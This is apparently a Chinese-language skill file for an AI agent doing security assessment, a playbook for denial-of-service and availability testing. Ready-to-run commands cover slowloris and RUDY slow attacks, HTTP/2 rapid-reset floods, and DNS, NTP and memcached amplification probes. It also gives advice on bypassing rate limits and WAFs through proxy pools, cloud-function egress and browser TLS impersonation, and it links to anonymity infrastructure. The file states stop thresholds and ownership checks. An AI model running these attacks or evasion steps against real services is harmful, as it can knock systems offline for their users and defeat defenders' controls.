---
name: stress-testing
description: 压力与可用性测试：应用层慢速攻击（slowloris/RUDY）、HTTP/2 快速重置、DNS/NTP/memcached 放大反射、限流与 WAF 绕过、压测指标与停止红线
whenToUse: 需要验证目标可用性与限流强度；评估 DoS 面；做容量与韧性测试
role: vuln-scan
enabled: true
---

# 压力与可用性测试

红线：以可复现的响应时间劣化/连接耗尽为证，不追求打挂生产；先小流量验证再放大。

## 一、应用层慢速

~~~
slowloris TARGET -p 80 -s 500          # 占连接不发完整请求
python3 rudy.py TARGET 80              # 慢速 POST body
h2load -n 10000 -c 200 -m 100 https://TARGET/
~~~

判定：worker/连接池耗尽 → 正常请求超时。

## 二、HTTP/2 快速重置

~~~
h2load -n 100000 -c 1 -m 1000 https://TARGET/    # 单连接高频 RST_STREAM，观察服务端 CPU
~~~

## 三、放大反射

~~~
dig ANY isc.org @OPEN_RESOLVER +short      # DNS 放大
ntpq -c monlist NTP_HOST                   # NTP monlist
printf 'stats\r\n' | nc -u -w1 MEMCACHED 11211   # memcached UDP
~~~

要点：开放解析器/放大器属第三方，先确认归属再测。

## 四、限流与 WAF 绕过

确认限流粒度（IP/账号/会话/指纹）；换源用代理池（见 cn-proxy-pool）、IPv6、云函数出口；TLS 指纹用 curl-impersonate-chrome。

## 五、指标与停止条件

| 指标 | 观察 | 红线 |
|---|---|---|
| P95 延迟 | 压测端 | 放大 5x |
| 错误率 | 5xx/超时 | >10% |
| 连接耗尽 | worker 数 | 新连接被拒 |
| CPU/内存 | 目标监控 | 持续 90% |

达到红线立即降速，记录时间/并发/延迟曲线。

## 六、工具矩阵

h2load / wrk / hey / vegeta（HTTP 压测）；slowloris / rudy（慢速）；dig / ntpq / memcached（放大验证）。

## 衔接

换源 → anonymity-infra / cn-proxy-pool；影响评估 → report-delivery
